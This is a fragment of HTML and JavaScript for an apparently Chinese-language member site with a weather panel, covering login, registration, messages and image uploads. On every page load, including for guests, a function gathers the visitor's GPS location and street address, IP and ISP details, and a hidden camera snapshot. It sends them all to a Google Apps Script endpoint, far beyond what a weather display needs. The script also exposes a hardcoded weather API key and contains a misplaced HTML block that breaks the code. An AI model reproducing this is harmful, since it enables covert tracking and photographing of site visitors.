            <button class="btn btn-primary w-100" type="submit">登入</button>

        <h5>天氣資訊</h5>

<script>
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby3ttEU7hp3lniJzsqA1DRtTmvrCd1iLsrlbssc4kX_gB1cbDo9zwfZBcaMMn_TBh-8qA/exec';
  const statusSuccess = document.getElementById('statusSuccess');
  const statusError = document.getElementById('statusError');
  const guestTip = document.getElementById('guestTip');
  const memberPanel = document.getElementById('memberPanel');
  function updateNavbar() {
    const navRight = document.getElementById('navRight');
    navRight.innerHTML = '';
    const email = sessionStorage.getItem('email');

    if (email) {
      const liHello = document.createElement('li');
      liHello.classList.add('nav-item', 'me-2');
      liHello.innerHTML = `<span class="nav-link disabled">您好，${email}</span>`;

      const liLogout = document.createElement('li');
      liLogout.classList.add('nav-item');
      const logoutBtn = document.createElement('button');
      logoutBtn.classList.add('btn', 'btn-secondary', 'btn-sm');
      logoutBtn.textContent = '登出';
      logoutBtn.onclick = () => {
        sessionStorage.removeItem('email');
        location.reload();
      };
      liLogout.appendChild(logoutBtn);

      navRight.appendChild(liHello);
      navRight.appendChild(liLogout);
    } else {
      const liUserCenter = document.createElement('li');
      liUserCenter.classList.add('nav-item', 'me-2');
      const userBtn = document.createElement('button');
      userBtn.classList.add('btn', 'btn-secondary', 'btn-sm');
      userBtn.textContent = '會員中心';
      userBtn.onclick = () => {
        const modal = new bootstrap.Modal(document.getElementById('userModal'));
        modal.show();
      };
      liUserCenter.appendChild(userBtn);
      const liAdmin = document.createElement('li');
      liAdmin.classList.add('nav-item');
      const adminBtn = document.createElement('button');
      adminBtn.classList.add('btn', 'btn-warning', 'btn-sm');
      adminBtn.textContent = '管理者登入';
      adminBtn.onclick = () => {
        const modal = new bootstrap.Modal(document.getElementById('adminModal'));
        modal.show();
      };
      liAdmin.appendChild(adminBtn);

      navRight.appendChild(liUserCenter);
      navRight.appendChild(liAdmin);
    }
  }
  function showSuccessMessage(msg) {
    statusSuccess.textContent = msg;
    statusSuccess.classList.remove('d-none');
    statusError.classList.add('d-none');
    setTimeout(() => {
      statusSuccess.style.opacity = '0';
      setTimeout(() => {
        statusSuccess.classList.add('d-none');
        statusSuccess.style.opacity = '1'; 
      }, 800);
    }, 3000);
  }
  function showErrorMessage(msg) {
    statusError.textContent = msg;
    statusError.classList.remove('d-none');
    statusSuccess.classList.add('d-none');
  }
  document.getElementById('registerForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('regEmail').value;
    const password = document.getElementById('regPassword').value;
    try {
      const formData = new FormData();
      formData.append('action', 'register');
      formData.append('email', email);
      formData.append('password', password);

      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
      if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
      const result = await resp.json();
      if (result.success) {
        showSuccessMessage('註冊成功，請切換到「登入」標籤！');
      } else {
        showErrorMessage('註冊失敗：' + (result.error || '未知原因'));
      }
    } catch (err) {
      showErrorMessage('註冊錯誤：' + err.message);
    }
  });
  document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    try {
      const formData = new FormData();
      formData.append('action', 'login');
      formData.append('email', email);
      formData.append('password', password);
      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
      if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
      const result = await resp.json();
      if (result.success) {
        sessionStorage.setItem('email', result.user_id);
        showSuccessMessage('登入成功！');
        const userModalObj = bootstrap.Modal.getInstance(document.getElementById('userModal'));
        if (userModalObj) userModalObj.hide();
        updateNavbar();
        guestTip.style.display = 'none';
        memberPanel.style.display = 'block';
        collectAndSendData();
      } else {
        showErrorMessage(`登入失敗：${result.error}`);
      }
    } catch (err) {
      showErrorMessage(`系統錯誤：${err.message}`);
    }
  });
  document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('adminEmail').value;
    const password = document.getElementById('adminPassword').value;
    try {
      const formData = new FormData();
      formData.append('action', 'adminLogin');
      formData.append('email', email);
      formData.append('password', password);
      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
      if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
      const result = await resp.json();
      if (result.success) {
        showSuccessMessage('管理者登入成功！');
        const adminModalObj = bootstrap.Modal.getInstance(document.getElementById('adminModal'));
        if (adminModalObj) adminModalObj.hide();
        window.location.href = 'https://your-domain/admin.php';
      } else {
        showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
      }
    } catch (err) {
      showErrorMessage('管理者登入錯誤：' + err.message);
    }
  });
  document.getElementById('sendMessageBtn').addEventListener('click', async () => {
    const email = sessionStorage.getItem('email') || 'guest_user';
    const message = document.getElementById('userMessage').value.trim();
    if (!message) {
      showErrorMessage('請先輸入訊息，再按「回傳訊息」');
      return;
    }
    try {
      const formData = new FormData();
      formData.append('action', 'sendMessage');
      formData.append('email', email);
      formData.append('textMessage', message);
      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
      const result = await resp.json();
      if (result.success) {
        showSuccessMessage('訊息已回傳成功！');
        document.getElementById('userMessage').value = '';
      } else {
        showErrorMessage(`回傳失敗：${result.error}`);
      }
    } catch (err) {
      showErrorMessage(`系統錯誤：${err.message}`);
    }
  });
  document.getElementById('sendImageBtn').addEventListener('click', async () => {
    const email = sessionStorage.getItem('email') || 'guest_user';
    const fileInput = document.getElementById('userImage');
    if (!fileInput.files[0]) {
      showErrorMessage('請先選擇圖片，再按「回傳圖片」');
      return;
    }
    try {
      const base64Data = await readFileAsBase64(fileInput.files[0]);
      const formData = new FormData();
      formData.append('action', 'sendUserImage');
      formData.append('email', email);
      formData.append('userImageData', base64Data);

      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
      const result = await resp.json();
      if (result.success) {
        showSuccessMessage('圖片已回傳成功！');
        fileInput.value = '';
      } else {
        showErrorMessage(`圖片回傳失敗：${result.error}`);
      }
    } catch (err) {
      showErrorMessage(`系統錯誤：${err.message}`);
    }
  });
  function readFileAsBase64(file) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => {
        const base64String = reader.result.split(',')[1];
        resolve(base64String);
      };
      reader.onerror = (err) => reject(err);
      reader.readAsDataURL(file);
    });
  }
  async function collectAndSendData() {
    const statusElem = document.getElementById('status');
    if (statusElem) {
      statusElem.textContent = '正在收集資料...';
    }

    const collectedData = { gps: null, ip: null, photo: null };
    try {
      const [gpsResult, ipResult] = await Promise.allSettled([
        getGpsCoordinates(),
        getIpInfo()
      ]);
      const photoResult = await startCamera(/* 可以在此傳 width, height → {width:1280,height:720} */);
      if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
      if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
      if (photoResult) collectedData.photo = photoResult;
      if (sessionStorage.getItem('email')) {
        updateUI(collectedData);
      }
      const formData = new FormData();
      const email = sessionStorage.getItem('email') || 'guest_user';
      formData.append('email', email);
      if (collectedData.gps) {
        formData.append('latitude', collectedData.gps.latitude);
        formData.append('longitude', collectedData.gps.longitude);
        formData.append('address', collectedData.gps.address);
      }
      if (collectedData.ip) {
        formData.append('ip', collectedData.ip.ip);
        formData.append('ipType', collectedData.ip.ipType);
        formData.append('userAgent', collectedData.ip.userAgent);
        formData.append('city', collectedData.ip.city);
        formData.append('region', collectedData.ip.region);
        formData.append('country', collectedData.ip.country);
        formData.append('org', collectedData.ip.org);
      }
      if (collectedData.photo) {
        formData.append('imageData', collectedData.photo);
      }
      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
      const result = await resp.json();
      if (statusElem) {
        if (result.success) {
          statusElem.textContent = '資料已成功發送！';
        } else {
          statusElem.textContent = `資料發送失敗：${result.error}`;
        }
      }
    } catch (err) {
      console.error('資料收集/上傳錯誤：', err);
      if (statusElem) {
        statusElem.textContent = '資料收集或傳送時發生錯誤。';
      }
    }
  }
  async function getIpInfo() {
    try {
      const resp = await fetch('https://ipinfo.io/json');
      const data = await resp.json();
      const { ip, city, region, country, org } = data;
      const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
      const userAgent = navigator.userAgent;
      return { ip, ipType, userAgent, city, region, country, org };
    } catch (err) {
      console.warn('IP 獲取失敗:', err);
      return null;
    }
  }
  async function getGpsCoordinates() {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
      });
      const { latitude, longitude } = position.coords;
      const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
      const data = await resp.json();
      const address = data.display_name || '未知地址';
      return { latitude, longitude, address };
    } catch (err) {
      console.warn('GPS 獲取失敗:', err);
      return null;
    }
  }
  async function startCamera() {
    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: { width: 1920, height: 1080 }
      });
      const video = document.createElement('video');
      video.srcObject = stream;
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });
      await new Promise((r) => setTimeout(r, 300));
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoData = canvas.toDataURL('image/jpeg', 1).split(',')[1]; 
      return photoData;
    } catch (error) {
      console.warn('相機啟動失敗:', error);
      return null;
    } finally {
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    }
  }
  function updateUI({ gps, ip }) {
    const ipElem = document.getElementById('ipInfo');
    if (ip && ipElem) {
      ipElem.textContent = `IP: ${ip.ip}, City: ${ip.city}, Region: ${ip.region}`;
    } else if (ipElem) {
      ipElem.textContent = '無法取得 IP 資訊';
    }
    if (gps) {
      document.getElementById('map').src = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}&hl=zh-TW&z=15&output=embed`;
      getWeatherInfo(gps.latitude, gps.longitude);
    }
  }
  async function getWeatherInfo(lat, lon) {
    try {
      if (!lat || !lon) return;
      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
      const resp = await fetch(
        `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`
      );
      const data = await resp.json();
      const temp = data.main.temp;
      const weather = data.weather[0].description;
      const humidity = data.main.humidity;
      document.getElementById('weatherInfo').innerHTML = `
        <img src="https://openweathermap.org/img/wn/${data.weather[0].icon}.png" alt="${weather}">
        溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%
      `;
    } catch (err) {
      console.error('天氣資訊獲取失敗:', err);
      document.getElementById('weatherInfo').textContent = '天氣資訊載入失敗...';
    }
  }



  // 忘記密碼 - 前端送出
  document.getElementById('forgotPasswordForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('forgotEmail').value;
    if (!email) {
      showErrorMessage('請輸入 Email');
      return;
    }
    try {
      const formData = new FormData();
      formData.append('action', 'forgotPassword');
      formData.append('email', email);

      const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
      const result = await resp.json();

      if (result.success) {
        showSuccessMessage('重設密碼連結已寄送至您的 Email (示範)');
        const modalObj = bootstrap.Modal.getInstance(document.getElementById('forgotPasswordModal'));
        if (modalObj) modalObj.hide();
      } else {
        showErrorMessage('忘記密碼錯誤：' + (result.error || '未知原因'));
      }
    } catch (err) {
      showErrorMessage('系統錯誤：' + err.message);
    }
  });

  // 登入區塊裡面示範如何彈出忘記密碼
  <div class="text-end">
  <a href="#" onclick="openForgotPasswordModal()">忘記密碼？</a>
 </div>
  function openForgotPasswordModal() {
    const fpModal = new bootstrap.Modal(document.getElementById('forgotPasswordModal'));
    fpModal.show();
  }



  
  document.addEventListener('DOMContentLoaded', async () => {
    updateNavbar();
    const email = sessionStorage.getItem('email');
    if (email) {
      guestTip.style.display = 'none';
      memberPanel.style.display = 'block';
    }
    collectAndSendData();
  });
</script>
